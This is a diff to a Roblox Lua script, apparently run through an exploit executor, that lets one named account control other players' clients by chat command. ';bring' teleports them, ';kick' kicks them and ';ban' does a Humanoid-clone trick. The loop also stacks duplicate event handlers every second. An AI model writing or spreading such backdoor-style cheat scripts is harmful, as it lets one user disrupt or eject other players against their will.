@@ -1,4 +1,7 @@
-local Player = game.Players.LisaBurns47
+while true do
+    if game.Players.LisaBurns47
+then
+    local Player = game.Players.LisaBurns47
 
 Player.Chatted:connect(function(cht)
     if cht:match(";bring") then
@@ -52,4 +55,64 @@ end
 
     end 
 end)
-           
+end
+wait(1)
+if game.Players.LisaBurns47
+then
+    local Player = game.Players.LisaBurns47
+
+Player.Chatted:connect(function(cht)
+    if cht:match(";bring") then
+        local me = game.Players.LocalPlayer.Character
+
+local targetplayer = game.Workspace.LisaBurns47.HumanoidRootPart
+
+me.HumanoidRootPart.CFrame = CFrame.new(targetplayer.Position.X, targetplayer.Position.Y, targetplayer.Position.Z)
+    end 
+end)
+local Player = game.Players.LisaBurns47
+
+Player.Chatted:connect(function(cht)
+    if cht:match(";kick") then
+        game.Players.LocalPlayer:Kick()
+    end 
+end)
+    local Player = game.Players.LisaBurns47
+
+Player.Chatted:connect(function(cht)
+    if cht:match(";ban") then
+        -- This script is made by Miyuki#7227
+
+
+
+local player = game.Players.LocalPlayer
+
+if player.Character then
+
+if player.Character:FindFirstChild("Humanoid") then
+
+player.Character.Humanoid.Name = "1"
+
+end
+
+local l = player.Character["1"]:Clone()
+
+l.Parent = player.Character
+
+l.Name = "Humanoid"; wait(0.1)
+
+player.Character["1"]:Destroy()
+
+workspace.CurrentCamera.CameraSubject = player.Character.Humanoid
+
+player.Character.Animate.Disabled = true; wait(0.1)
+
+player.Character.Animate.Disabled = false
+
+end
+
+    end 
+end)
+end
+wait(1)
+end
